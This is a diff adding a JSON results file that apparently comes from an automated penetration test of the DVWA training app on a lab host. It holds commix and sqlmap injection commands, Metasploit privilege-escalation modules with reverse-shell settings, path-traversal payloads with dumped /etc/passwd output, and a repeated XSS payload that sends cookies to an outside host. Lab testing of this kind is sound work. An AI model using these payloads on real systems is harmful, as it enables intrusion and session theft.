@@ -1,0 +1,870 @@
+{
+    "Pentest path 1": {
+        "Initial exploit": {
+            "url": "http://192.168.1.112/dvwa/vulnerabilities/exec/",
+            "name": "Operating system command injection (timing attack)",
+            "cwe": 78,
+            "cookie": {
+                "security": "low",
+                "PHPSESSID": "46a3e14989f7cc268d50b7f1374d791d"
+            },
+            "shell": "true",
+            "shell_user": "www-data",
+            "vector": {
+                "method": "post",
+                "affected_arg": "ip",
+                "args": {
+                    "ip": "",
+                    "submit": "submit"
+                },
+                "commix_cmd": "python3 commix/commix.py --url http://192.168.1.112/dvwa/vulnerabilities/exec/ --data 'ip=INJECT_HERE&submit=submit' --cookie 'security=low;PHPSESSID=46a3e14989f7cc268d50b7f1374d791d'"
+            },
+            "state": "exploit",
+            "next_state": "basic"
+        },
+        "Privilege escalation": {
+            "tools": [
+                "msfconsole",
+                "commix"
+            ],
+            "exploits": {
+                "0": "exploit/linux/local/glibc_ld_audit_dso_load_priv_esc",
+                "1": "exploit/linux/local/glibc_origin_expansion_priv_esc",
+                "2": "exploit/linux/local/netfilter_priv_esc_ipv4",
+                "3": "exploit/linux/local/ptrace_sudo_token_priv_esc"
+            },
+            "success": "true",
+            "effective_exploit": "exploit/linux/local/glibc_ld_audit_dso_load_priv_esc",
+            "msf_script": "7281.rc",
+            "commix_commands": {
+                "0": "python3 commix/commix.py --url http://192.168.1.112/dvwa/vulnerabilities/exec/ --data 'ip=INJECT_HERE&submit=submit' --cookie 'security=low;PHPSESSID=46a3e14989f7cc268d50b7f1374d791d'",
+                "1": "reverse_tcp",
+                "2": "set LHOST 192.168.1.111",
+                "3": "set LPORT 4444",
+                "4": "1",
+                "5": "1",
+                "6": "y"
+            },
+            "state": "basic",
+            "next_state": "root"
+        }
+    },
+    "Pentest path 2": {
+        "Initial exploit": {
+            "name": "Remote File Inclusion",
+            "cwe": 94,
+            "url": "http://192.168.1.112/dvwa/vulnerabilities/fi/",
+            "cookie": {
+                "security": "low",
+                "PHPSESSID": "46a3e14989f7cc268d50b7f1374d791d"
+            },
+            "shell": "true",
+            "shell_user": "meterpreter > whoami\r",
+            "msf_script": "5675.rc",
+            "vector": {
+                "affected_arg": "page",
+                "args": {
+                    "page": "include.php"
+                }
+            },
+            "state": "exploit",
+            "next_state": "basic"
+        },
+        "Privilege escalation": {
+            "tools": [
+                "msfconsole"
+            ],
+            "exploits": {},
+            "success": "false",
+            "effective_exploit": "",
+            "msf_script": "9906.rc",
+            "state": "basic",
+            "next_state": "initialization"
+        }
+    },
+    "Pentest path 3": {
+        "name": "Blind SQL Injection (timing attack)",
+        "cwe": 89,
+        "url": "http://192.168.1.112/dvwa/vulnerabilities/sqli_blind/",
+        "cookie": {
+            "security": "low",
+            "PHPSESSID": "46a3e14989f7cc268d50b7f1374d791d"
+        },
+        "shell": "true",
+        "shell_user": "sql",
+        "vector": {
+            "method": "get",
+            "affected_arg": "id",
+            "args": {
+                "id": "",
+                "Submit": "Submit"
+            },
+            "sqlmap_cmd": "sqlmap --url \"http://192.168.1.112/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit\" -p id --cookie \"security=low;PHPSESSID=46a3e14989f7cc268d50b7f1374d791d\" --sql-shell"
+        },
+        "state": "exploit",
+        "next_state": "sql"
+    },
+    "Pentest path 4": {
+        "name": "Blind SQL Injection (timing attack)",
+        "cwe": 89,
+        "url": "http://192.168.1.112/dvwa/vulnerabilities/brute/",
+        "cookie": {
+            "security": "low",
+            "PHPSESSID": "46a3e14989f7cc268d50b7f1374d791d"
+        },
+        "shell": "true",
+        "shell_user": "sql",
+        "vector": {
+            "method": "get",
+            "affected_arg": "username",
+            "args": {
+                "username": "",
+                "password": "",
+                "Login": "Login"
+            },
+            "sqlmap_cmd": "sqlmap --url \"http://192.168.1.112/dvwa/vulnerabilities/brute/?username=1&password=&Login=Login\" -p username --cookie \"security=low;PHPSESSID=46a3e14989f7cc268d50b7f1374d791d\" --sql-shell"
+        },
+        "state": "exploit",
+        "next_state": "sql"
+    },
+    "Pentest path 5": {
+        "name": "SQL Injection",
+        "cwe": 89,
+        "url": "http://192.168.1.112/dvwa/vulnerabilities/brute/",
+        "cookie": {
+            "security": "low",
+            "PHPSESSID": "46a3e14989f7cc268d50b7f1374d791d"
+        },
+        "shell": "true",
+        "shell_user": "sql",
+        "vector": {
+            "method": "get",
+            "affected_arg": "username",
+            "args": {
+                "username": "",
+                "password": "",
+                "Login": "Login"
+            },
+            "sqlmap_cmd": "sqlmap --url \"http://192.168.1.112/dvwa/vulnerabilities/brute/?username=1&password=&Login=Login\" -p username --cookie \"security=low;PHPSESSID=46a3e14989f7cc268d50b7f1374d791d\" --sql-shell"
+        },
+        "state": "exploit",
+        "next_state": "sql"
+    },
+    "Pentest path 6": {
+        "name": "Blind SQL Injection (timing attack)",
+        "cwe": 89,
+        "url": "http://192.168.1.112/dvwa/vulnerabilities/sqli/",
+        "cookie": {
+            "security": "low",
+            "PHPSESSID": "46a3e14989f7cc268d50b7f1374d791d"
+        },
+        "shell": "true",
+        "shell_user": "sql",
+        "vector": {
+            "method": "get",
+            "affected_arg": "id",
+            "args": {
+                "id": "",
+                "Submit": "Submit"
+            },
+            "sqlmap_cmd": "sqlmap --url \"http://192.168.1.112/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit\" -p id --cookie \"security=low;PHPSESSID=46a3e14989f7cc268d50b7f1374d791d\" --sql-shell"
+        },
+        "state": "exploit",
+        "next_state": "sql"
+    },
+    "Pentest path 7": {
+        "name": "SQL Injection",
+        "cwe": 89,
+        "url": "http://192.168.1.112/dvwa/vulnerabilities/sqli/",
+        "cookie": {
+            "security": "low",
+            "PHPSESSID": "46a3e14989f7cc268d50b7f1374d791d"
+        },
+        "shell": "true",
+        "shell_user": "sql",
+        "vector": {
+            "method": "get",
+            "affected_arg": "id",
+            "args": {
+                "id": "",
+                "Submit": "Submit"
+            },
+            "sqlmap_cmd": "sqlmap --url \"http://192.168.1.112/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit\" -p id --cookie \"security=low;PHPSESSID=46a3e14989f7cc268d50b7f1374d791d\" --sql-shell"
+        },
+        "state": "exploit",
+        "next_state": "sql"
+    },
+    "Pentest path 8": {
+        "name": "Path Traversal",
+        "cwe": 22,
+        "url": "http://192.168.1.112/dvwa/vulnerabilities/view_source_all.php",
+        "cookie": {
+            "security": "low",
+            "PHPSESSID": "46a3e14989f7cc268d50b7f1374d791d"
+        },
+        "verified": "true",
+        "vector": {
+            "method": "get",
+            "affected_arg": "id",
+            "args": {
+                "id": ""
+            },
+            "verified_args": {
+                "id": "/../../../../..//etc/passwd\u0000."
+            },
+            "seed": "/../../../../..//etc/passwd",
+            "proof": ":x:0:0:root:/root:/bin/bash<br />daemon:x:1:1:daemon:/usr/sbin:/bin/sh<br />bin:x:2:2:bin:/bin:/bin/sh<br />sys:x:3:3:sys:/dev:/bin/sh<br />sync:x:4:65534:sync:/bin:/bin/sync<br />games:x:5:60:games:/usr/games:/bin/sh<br />man:x:6:12:man:/var/cache/man:/bin/sh<br />lp:x:7:7:lp:/var/spool/lpd:/bin/sh<br />mail:x:8:8:mail:/var/mail:/bin/sh<br />news:x:9:9:news:/var/spool/news:/bin/sh<br />uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh<br />proxy:x:13:13:proxy:/bin:/bin/sh<br />www-data:x:33:33:www-data:/var/www:/bin/sh<br />backup:x:34:34:backup:/var/backups:/bin/sh<br />list:x:38:38:Mailing&nbsp;List&nbsp;Manager:/var/list:/bin/sh<br />irc:x:39:39:ircd:/var/run/ircd:/bin/sh<br />gnats:x:41:41:Gnats&nbsp;Bug-Reporting&nbsp;System&nbsp;(admin):/var/lib/gnats:/bin/sh<br />nobody:x:65534:65534:nobody:/nonexistent:/bin/sh<br />libuuid:x:100:101::/var/lib/libuuid:/bin/sh<br />dhcp:x:101:102::/nonexistent:/bin/false<br />syslog:x:102:103::/home/syslog:/bin/false<br />klog:x:103:104::/home/klog:/bin/false<br />sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin<br />msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash<br />bind:x:105:113::/var/cache/bind:/bin/false<br />postfix:x:106:115::/var/spool/postfix:/bin/false<br />ftp:x:107:65534::/home/ftp:/bin/false<br />postgres:x:108:117:PostgreSQL&nbsp;administrator,,,:/var/lib/postgresql:/bin/bash<br />mysql:x:109:118:MySQL&nbsp;Server,,,:/var/lib/mysql:/bin/false<br />tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false<br />distccd:x:111:65534::/:/bin/false<br />user:x:1001:1001:just&nbsp;a&nbsp;user,111,,:/home/user:/bin/bash<br />service:x:1002:1002:,,,:/home/service:/bin/bash<br />telnetd:x:112:120::/nonexistent:/bin/false<br />proftpd:x:113:65534::/var/run/proftpd:/bin/false<br />statd:x:114:65534::/var/lib/nfs:/bin/false"
+        },
+        "state": "exploit",
+        "next_state": "initialization"
+    },
+    "Pentest path 9": {
+        "name": "Path Traversal",
+        "cwe": 22,
+        "url": "http://192.168.1.112/dvwa/vulnerabilities/fi/",
+        "cookie": {
+            "security": "low",
+            "PHPSESSID": "46a3e14989f7cc268d50b7f1374d791d"
+        },
+        "verified": "true",
+        "vector": {
+            "method": "get",
+            "affected_arg": "page",
+            "args": {
+                "page": "include.php"
+            },
+            "verified_args": {
+                "page": "file:///../..//etc/passwd"
+            },
+            "seed": "file:///../..//etc/passwd",
+            "proof": ":x:0:0:root:/root:/bin/bash"
+        },
+        "state": "exploit",
+        "next_state": "initialization"
+    },
+    "Pentest path 10": {
+        "name": "File Inclusion",
+        "cwe": 98,
+        "url": "http://192.168.1.112/dvwa/vulnerabilities/fi/",
+        "cookie": {
+            "security": "low",
+            "PHPSESSID": "46a3e14989f7cc268d50b7f1374d791d"
+        },
+        "verified": "true",
+        "vector": {
+            "method": "get",
+            "affected_arg": "page",
+            "args": {
+                "page": "include.php"
+            },
+            "verified_args": {
+                "page": "file:///etc/passwd"
+            },
+            "seed": "file:///etc/passwd",
+            "proof": ":x:0:0:root:/root:/bin/bash"
+        },
+        "state": "exploit",
+        "next_state": "initialization"
+    },
+    "Pentest path 11": {
+        "name": "DOM-based Cross-Site Scripting (XSS) in script context",
+        "cwe": 79,
+        "url": "http://192.168.1.112/dvwa/vulnerabilities/xss_s/",
+        "cookie": {
+            "security": "low",
+            "PHPSESSID": "46a3e14989f7cc268d50b7f1374d791d"
+        },
+        "verified": "false",
+        "vector": {
+            "method": "get",
+            "affected_arg": "txtName",
+            "args": {
+                "mtxMessage": "",
+                "txtName": "",
+                "btnSign": "Sign Guestbook"
+            },
+            "verified_args": {
+                "mtxMessage": "",
+                "txtName": "1<img sRC=8620>",
+                "btnSign": "Sign Guestbook"
+            },
+            "seed": "<img sRC=8620>",
+            "proof": "<img sRC=8620>",
+            "payload": "</tEXtArEa>'\"><img src=# style=display:none onerror=this.src='http://152.67.111.213/CTF/cookies.php?cookie='+document.cookie//>"
+        },
+        "state": "exploit",
+        "next_state": "initialization"
+    },
+    "Pentest path 12": {
+        "name": "DOM-based Cross-Site Scripting (XSS) in script context",
+        "cwe": 79,
+        "url": "http://192.168.1.112/dvwa/vulnerabilities/xss_s/",
+        "cookie": {
+            "security": "low",
+            "PHPSESSID": "46a3e14989f7cc268d50b7f1374d791d"
+        },
+        "verified": "false",
+        "vector": {
+            "method": "get",
+            "affected_arg": "btnSign",
+            "args": {
+                "mtxMessage": "",
+                "txtName": "",
+                "btnSign": "Sign Guestbook"
+            },
+            "verified_args": {
+                "mtxMessage": "",
+                "txtName": "",
+                "btnSign": "1<img sRC=6043>"
+            },
+            "seed": "<img sRC=6043>",
+            "proof": "<img sRC=6043>",
+            "payload": "</tEXtArEa>'\"><img src=# style=display:none onerror=this.src='http://152.67.111.213/CTF/cookies.php?cookie='+document.cookie//>"
+        },
+        "state": "exploit",
+        "next_state": "initialization"
+    },
+    "Pentest path 13": {
+        "name": "Cross-Site Scripting (XSS) in script context",
+        "cwe": 79,
+        "url": "http://192.168.1.112/dvwa/vulnerabilities/xss_s/",
+        "cookie": {
+            "security": "low",
+            "PHPSESSID": "46a3e14989f7cc268d50b7f1374d791d"
+        },
+        "verified": "false",
+        "vector": {
+            "method": "post",
+            "affected_arg": "btnSign",
+            "args": {
+                "mtxMessage": "",
+                "txtName": "",
+                "btnSign": "Sign Guestbook"
+            },
+            "verified_args": {
+                "mtxMessage": "",
+                "txtName": "",
+                "btnSign": "1<img sRC=2152>"
+            },
+            "seed": "<img sRC=2152>",
+            "proof": "<img sRC=2152>",
+            "payload": "</tEXtArEa>'\"><img src=# style=display:none onerror=this.src='http://152.67.111.213/CTF/cookies.php?cookie='+document.cookie//>"
+        },
+        "state": "exploit",
+        "next_state": "initialization"
+    },
+    "Pentest path 14": {
+        "name": "Cross-Site Scripting (XSS) in script context",
+        "cwe": 79,
+        "url": "http://192.168.1.112/dvwa/vulnerabilities/xss_s/",
+        "cookie": {
+            "security": "low",
+            "PHPSESSID": "46a3e14989f7cc268d50b7f1374d791d"
+        },
+        "verified": "true",
+        "vector": {
+            "method": "post",
+            "affected_arg": "mtxMessage",
+            "args": {
+                "mtxMessage": "",
+                "txtName": "",
+                "btnSign": "Sign Guestbook"
+            },
+            "verified_args": {
+                "mtxMessage": "1<img sRC=5174>",
+                "txtName": "",
+                "btnSign": "Sign Guestbook"
+            },
+            "seed": "<img sRC=5174>",
+            "proof": "<img sRC=5174>",
+            "payload": "</tEXtArEa>'\"><img src=# style=display:none onerror=this.src='http://152.67.111.213/CTF/cookies.php?cookie='+document.cookie//>"
+        },
+        "state": "exploit",
+        "next_state": "initialization"
+    },
+    "Pentest path 15": {
+        "name": "Cross-Site Scripting (XSS) in script context",
+        "cwe": 79,
+        "url": "http://192.168.1.112/dvwa/vulnerabilities/xss_r/",
+        "cookie": {
+            "security": "low",
+            "PHPSESSID": "46a3e14989f7cc268d50b7f1374d791d"
+        },
+        "verified": "true",
+        "vector": {
+            "method": "get",
+            "affected_arg": "name",
+            "args": {
+                "name": ""
+            },
+            "verified_args": {
+                "name": "1<img sRC=8608>"
+            },
+            "seed": "<img sRC=8608>",
+            "proof": "<img sRC=8608>",
+            "payload": "</tEXtArEa>'\"><img src=# style=display:none onerror=this.src='http://152.67.111.213/CTF/cookies.php?cookie='+document.cookie//>"
+        },
+        "state": "exploit",
+        "next_state": "initialization"
+    },
+    "Pentest path 16": {
+        "name": "Cross-Site Scripting (XSS)",
+        "cwe": 79,
+        "url": "http://192.168.1.112/dvwa/vulnerabilities/xss_r/",
+        "cookie": {
+            "security": "low",
+            "PHPSESSID": "46a3e14989f7cc268d50b7f1374d791d"
+        },
+        "verified": "true",
+        "vector": {
+            "method": "get",
+            "affected_arg": "name",
+            "args": {
+                "name": ""
+            },
+            "verified_args": {
+                "name": "1<img sRC=1031>"
+            },
+            "seed": "<img sRC=1031>",
+            "proof": "<img sRC=1031>",
+            "payload": "</tEXtArEa>'\"><img src=# style=display:none onerror=this.src='http://152.67.111.213/CTF/cookies.php?cookie='+document.cookie//>"
+        },
+        "state": "exploit",
+        "next_state": "initialization"
+    },
+    "Pentest path 17": {
+        "name": "Cross-Site Scripting (XSS)",
+        "cwe": 79,
+        "url": "http://192.168.1.112/dvwa/vulnerabilities/sqli_blind/",
+        "cookie": {
+            "security": "low",
+            "PHPSESSID": "46a3e14989f7cc268d50b7f1374d791d"
+        },
+        "verified": "true",
+        "vector": {
+            "method": "get",
+            "affected_arg": "id",
+            "args": {
+                "id": "",
+                "Submit": "Submit"
+            },
+            "verified_args": {
+                "id": "1<img sRC=7675>",
+                "Submit": "Submit"
+            },
+            "seed": "<img sRC=7675>",
+            "proof": "<img sRC=7675>",
+            "payload": "</tEXtArEa>'\"><img src=# style=display:none onerror=this.src='http://152.67.111.213/CTF/cookies.php?cookie='+document.cookie//>"
+        },
+        "state": "exploit",
+        "next_state": "initialization"
+    },
+    "Pentest path 18": {
+        "name": "Cross-Site Scripting (XSS)",
+        "cwe": 79,
+        "url": "http://192.168.1.112/dvwa/instructions.php",
+        "cookie": {
+            "security": "low",
+            "PHPSESSID": "46a3e14989f7cc268d50b7f1374d791d"
+        },
+        "verified": "false",
+        "vector": {
+            "method": "get",
+            "affected_arg": "doc",
+            "args": {
+                "doc": "readme"
+            },
+            "verified_args": {
+                "doc": "1%28%29%22%26%251%27-%3B%3Cxss_0185594ce4e0f14f2fc9073a9a7e8ead%2F%3E%27<img sRC=9595>"
+            },
+            "seed": "%28%29%22%26%251%27-%3B%3Cxss_0185594ce4e0f14f2fc9073a9a7e8ead%2F%3E%27<img sRC=9595>",
+            "proof": "<img sRC=9595>",
+            "payload": "</tEXtArEa>'\"><img src=# style=display:none onerror=this.src='http://152.67.111.213/CTF/cookies.php?cookie='+document.cookie//>"
+        },
+        "state": "exploit",
+        "next_state": "initialization"
+    },
+    "Pentest path 19": {
+        "name": "DOM-based Cross-Site Scripting (XSS) in script context",
+        "cwe": 79,
+        "url": "http://192.168.1.112/dvwa/vulnerabilities/xss_s/",
+        "cookie": {
+            "security": "low",
+            "PHPSESSID": "46a3e14989f7cc268d50b7f1374d791d"
+        },
+        "verified": "false",
+        "vector": {
+            "method": "get",
+            "affected_arg": "mtxMessage",
+            "args": {
+                "mtxMessage": "",
+                "txtName": "",
+                "btnSign": "Sign Guestbook"
+            },
+            "verified_args": {
+                "mtxMessage": "1<img sRC=8838>",
+                "txtName": "",
+                "btnSign": "Sign Guestbook"
+            },
+            "seed": "<img sRC=8838>",
+            "proof": "<img sRC=8838>",
+            "payload": "</tEXtArEa>'\"><img src=# style=display:none onerror=this.src='http://152.67.111.213/CTF/cookies.php?cookie='+document.cookie//>"
+        },
+        "state": "exploit",
+        "next_state": "initialization"
+    },
+    "Pentest path 20": {
+        "name": "DOM-based Cross-Site Scripting (XSS)",
+        "cwe": 79,
+        "url": "http://192.168.1.112/dvwa/vulnerabilities/xss_s/",
+        "cookie": {
+            "security": "low",
+            "PHPSESSID": "46a3e14989f7cc268d50b7f1374d791d"
+        },
+        "verified": "false",
+        "vector": {
+            "method": "get",
+            "affected_arg": "btnSign",
+            "args": {
+                "mtxMessage": "",
+                "txtName": "",
+                "btnSign": "Sign Guestbook"
+            },
+            "verified_args": {
+                "mtxMessage": "",
+                "txtName": "",
+                "btnSign": "1<xss_dom_0185594ce4e0f14f2fc9073a9a7e8ead/><img sRC=3860>"
+            },
+            "seed": "<xss_dom_0185594ce4e0f14f2fc9073a9a7e8ead/><img sRC=3860>",
+            "proof": "<img sRC=3860>",
+            "payload": "</tEXtArEa>'\"><img src=# style=display:none onerror=this.src='http://152.67.111.213/CTF/cookies.php?cookie='+document.cookie//>"
+        },
+        "state": "exploit",
+        "next_state": "initialization"
+    },
+    "Pentest path 21": {
+        "name": "Cross-Site Scripting (XSS) in script context",
+        "cwe": 79,
+        "url": "http://192.168.1.112/dvwa/vulnerabilities/xss_s/",
+        "cookie": {
+            "security": "low",
+            "PHPSESSID": "46a3e14989f7cc268d50b7f1374d791d"
+        },
+        "verified": "true",
+        "vector": {
+            "method": "post",
+            "affected_arg": "txtName",
+            "args": {
+                "mtxMessage": "",
+                "txtName": "",
+                "btnSign": "Sign Guestbook"
+            },
+            "verified_args": {
+                "mtxMessage": "",
+                "txtName": "1<img sRC=5630>",
+                "btnSign": "Sign Guestbook"
+            },
+            "seed": "<img sRC=5630>",
+            "proof": "<img sRC=5630>",
+            "payload": "</tEXtArEa>'\"><img src=# style=display:none onerror=this.src='http://152.67.111.213/CTF/cookies.php?cookie='+document.cookie//>"
+        },
+        "state": "exploit",
+        "next_state": "initialization"
+    },
+    "Pentest path 22": {
+        "name": "DOM-based Cross-Site Scripting (XSS)",
+        "cwe": 79,
+        "url": "http://192.168.1.112/dvwa/vulnerabilities/xss_s/",
+        "cookie": {
+            "security": "low",
+            "PHPSESSID": "46a3e14989f7cc268d50b7f1374d791d"
+        },
+        "verified": "false",
+        "vector": {
+            "method": "get",
+            "affected_arg": "txtName",
+            "args": {
+                "mtxMessage": "",
+                "txtName": "",
+                "btnSign": "Sign Guestbook"
+            },
+            "verified_args": {
+                "mtxMessage": "",
+                "txtName": "1<xss_dom_0185594ce4e0f14f2fc9073a9a7e8ead/><img sRC=8366>",
+                "btnSign": "Sign Guestbook"
+            },
+            "seed": "<xss_dom_0185594ce4e0f14f2fc9073a9a7e8ead/><img sRC=8366>",
+            "proof": "<img sRC=8366>",
+            "payload": "</tEXtArEa>'\"><img src=# style=display:none onerror=this.src='http://152.67.111.213/CTF/cookies.php?cookie='+document.cookie//>"
+        },
+        "state": "exploit",
+        "next_state": "initialization"
+    },
+    "Pentest path 23": {
+        "name": "DOM-based Cross-Site Scripting (XSS)",
+        "cwe": 79,
+        "url": "http://192.168.1.112/dvwa/vulnerabilities/xss_s/",
+        "cookie": {
+            "security": "low",
+            "PHPSESSID": "46a3e14989f7cc268d50b7f1374d791d"
+        },
+        "verified": "false",
+        "vector": {
+            "method": "get",
+            "affected_arg": "mtxMessage",
+            "args": {
+                "mtxMessage": "",
+                "txtName": "",
+                "btnSign": "Sign Guestbook"
+            },
+            "verified_args": {
+                "mtxMessage": "1<xss_dom_0185594ce4e0f14f2fc9073a9a7e8ead/><img sRC=6874>",
+                "txtName": "",
+                "btnSign": "Sign Guestbook"
+            },
+            "seed": "<xss_dom_0185594ce4e0f14f2fc9073a9a7e8ead/><img sRC=6874>",
+            "proof": "<img sRC=6874>",
+            "payload": "</tEXtArEa>'\"><img src=# style=display:none onerror=this.src='http://152.67.111.213/CTF/cookies.php?cookie='+document.cookie//>"
+        },
+        "state": "exploit",
+        "next_state": "initialization"
+    },
+    "Pentest path 24": {
+        "name": "Cross-Site Scripting (XSS)",
+        "cwe": 79,
+        "url": "http://192.168.1.112/dvwa/vulnerabilities/xss_s/",
+        "cookie": {
+            "security": "low",
+            "PHPSESSID": "46a3e14989f7cc268d50b7f1374d791d"
+        },
+        "verified": "false",
+        "vector": {
+            "method": "post",
+            "affected_arg": "btnSign",
+            "args": {
+                "mtxMessage": "",
+                "txtName": "",
+                "btnSign": "Sign Guestbook"
+            },
+            "verified_args": {
+                "mtxMessage": "",
+                "txtName": "",
+                "btnSign": "1%28%29%22%26%251%27-%3B%3Cxss_0185594ce4e0f14f2fc9073a9a7e8ead%2F%3E%27<img sRC=8516>"
+            },
+            "seed": "%28%29%22%26%251%27-%3B%3Cxss_0185594ce4e0f14f2fc9073a9a7e8ead%2F%3E%27<img sRC=8516>",
+            "proof": "<img sRC=8516>",
+            "payload": "</tEXtArEa>'\"><img src=# style=display:none onerror=this.src='http://152.67.111.213/CTF/cookies.php?cookie='+document.cookie//>"
+        },
+        "state": "exploit",
+        "next_state": "initialization"
+    },
+    "Pentest path 25": {
+        "name": "Cross-Site Scripting (XSS)",
+        "cwe": 79,
+        "url": "http://192.168.1.112/dvwa/vulnerabilities/xss_s/",
+        "cookie": {
+            "security": "low",
+            "PHPSESSID": "46a3e14989f7cc268d50b7f1374d791d"
+        },
+        "verified": "true",
+        "vector": {
+            "method": "post",
+            "affected_arg": "mtxMessage",
+            "args": {
+                "mtxMessage": "",
+                "txtName": "",
+                "btnSign": "Sign Guestbook"
+            },
+            "verified_args": {
+                "mtxMessage": "1%28%29%22%26%251%27-%3B%3Cxss_0185594ce4e0f14f2fc9073a9a7e8ead%2F%3E%27<img sRC=8243>",
+                "txtName": "",
+                "btnSign": "Sign Guestbook"
+            },
+            "seed": "%28%29%22%26%251%27-%3B%3Cxss_0185594ce4e0f14f2fc9073a9a7e8ead%2F%3E%27<img sRC=8243>",
+            "proof": "<img sRC=8243>",
+            "payload": "</tEXtArEa>'\"><img src=# style=display:none onerror=this.src='http://152.67.111.213/CTF/cookies.php?cookie='+document.cookie//>"
+        },
+        "state": "exploit",
+        "next_state": "initialization"
+    },
+    "Pentest path 26": {
+        "name": "Cross-Site Scripting (XSS)",
+        "cwe": 79,
+        "url": "http://192.168.1.112/dvwa/vulnerabilities/xss_s/",
+        "cookie": {
+            "security": "low",
+            "PHPSESSID": "46a3e14989f7cc268d50b7f1374d791d"
+        },
+        "verified": "true",
+        "vector": {
+            "method": "post",
+            "affected_arg": "txtName",
+            "args": {
+                "mtxMessage": "",
+                "txtName": "",
+                "btnSign": "Sign Guestbook"
+            },
+            "verified_args": {
+                "mtxMessage": "",
+                "txtName": "1</textarea>--><!--<textarea><img sRC=3676>",
+                "btnSign": "Sign Guestbook"
+            },
+            "seed": "</textarea>--><!--<textarea><img sRC=3676>",
+            "proof": "<img sRC=3676>",
+            "payload": "</tEXtArEa>'\"><img src=# style=display:none onerror=this.src='http://152.67.111.213/CTF/cookies.php?cookie='+document.cookie//>"
+        },
+        "state": "exploit",
+        "next_state": "initialization"
+    },
+    "Pentest path 27": {
+        "name": "Cross-Site Scripting (XSS)",
+        "cwe": 79,
+        "url": "http://192.168.1.112/dvwa/vulnerabilities/brute/",
+        "cookie": {
+            "security": "low",
+            "PHPSESSID": "46a3e14989f7cc268d50b7f1374d791d"
+        },
+        "verified": "true",
+        "vector": {
+            "method": "get",
+            "affected_arg": "username",
+            "args": {
+                "username": "",
+                "password": "",
+                "Login": "Login"
+            },
+            "verified_args": {
+                "username": "1()\"&%1'-;'<img sRC=5648>",
+                "password": "",
+                "Login": "Login"
+            },
+            "seed": "()\"&%1'-;'<img sRC=5648>",
+            "proof": "<img sRC=5648>",
+            "payload": "</tEXtArEa>'\"><img src=# style=display:none onerror=this.src='http://152.67.111.213/CTF/cookies.php?cookie='+document.cookie//>"
+        },
+        "state": "exploit",
+        "next_state": "initialization"
+    },
+    "Pentest path 28": {
+        "name": "Cross-Site Scripting (XSS)",
+        "cwe": 79,
+        "url": "http://192.168.1.112/dvwa/vulnerabilities/sqli/",
+        "cookie": {
+            "security": "low",
+            "PHPSESSID": "46a3e14989f7cc268d50b7f1374d791d"
+        },
+        "verified": "true",
+        "vector": {
+            "method": "get",
+            "affected_arg": "id",
+            "args": {
+                "id": "",
+                "Submit": "Submit"
+            },
+            "verified_args": {
+                "id": "1<img sRC=9019>",
+                "Submit": "Submit"
+            },
+            "seed": "<img sRC=9019>",
+            "proof": "<img sRC=9019>",
+            "payload": "</tEXtArEa>'\"><img src=# style=display:none onerror=this.src='http://152.67.111.213/CTF/cookies.php?cookie='+document.cookie//>"
+        },
+        "state": "exploit",
+        "next_state": "initialization"
+    },
+    "Pentest path 29": {
+        "name": "Cross-Site Request Forgery",
+        "cwe": 352,
+        "url": "http://192.168.1.112/dvwa/vulnerabilities/xss_r/",
+        "method": "get",
+        "affected_path": [
+            "Pentest path 15",
+            "Pentest path 16"
+        ],
+        "state": "exploit",
+        "next_state": "initialization"
+    },
+    "Pentest path 30": {
+        "name": "Cross-Site Request Forgery",
+        "cwe": 352,
+        "url": "http://192.168.1.112/dvwa/vulnerabilities/sqli_blind/",
+        "method": "get",
+        "affected_path": [
+            "Pentest path 3",
+            "Pentest path 17"
+        ],
+        "state": "exploit",
+        "next_state": "initialization"
+    },
+    "Pentest path 31": {
+        "name": "Cross-Site Request Forgery",
+        "cwe": 352,
+        "url": "http://192.168.1.112/dvwa/vulnerabilities/xss_s/",
+        "method": "post",
+        "affected_path": [
+            "Pentest path 13",
+            "Pentest path 14",
+            "Pentest path 21",
+            "Pentest path 24",
+            "Pentest path 25",
+            "Pentest path 26"
+        ],
+        "state": "exploit",
+        "next_state": "initialization"
+    },
+    "Pentest path 32": {
+        "name": "Cross-Site Request Forgery",
+        "cwe": 352,
+        "url": "http://192.168.1.112/dvwa/vulnerabilities/upload/",
+        "method": "post",
+        "affected_path": [],
+        "state": "exploit",
+        "next_state": "initialization"
+    },
+    "Pentest path 33": {
+        "name": "Cross-Site Request Forgery",
+        "cwe": 352,
+        "url": "http://192.168.1.112/dvwa/vulnerabilities/csrf/",
+        "method": "get",
+        "affected_path": [],
+        "state": "exploit",
+        "next_state": "initialization"
+    },
+    "Pentest path 34": {
+        "name": "Cross-Site Request Forgery",
+        "cwe": 352,
+        "url": "http://192.168.1.112/dvwa/vulnerabilities/brute/",
+        "method": "get",
+        "affected_path": [
+            "Pentest path 4",
+            "Pentest path 5",
+            "Pentest path 27"
+        ],
+        "state": "exploit",
+        "next_state": "initialization"
+    },
+    "Pentest path 35": {
+        "name": "Cross-Site Request Forgery",
+        "cwe": 352,
+        "url": "http://192.168.1.112/dvwa/vulnerabilities/sqli/",
+        "method": "get",
+        "affected_path": [
+            "Pentest path 6",
+            "Pentest path 7",
+            "Pentest path 28"
+        ],
+        "state": "exploit",
+        "next_state": "initialization"
+    },
+    "Pentest path 36": {
+        "name": "Cross-Site Request Forgery",
+        "cwe": 352,
+        "url": "http://192.168.1.112/dvwa/vulnerabilities/exec/",
+        "method": "post",
+        "affected_path": [
+            "Pentest path 1"
+        ],
+        "state": "exploit",
+        "next_state": "initialization"
+    }
+}
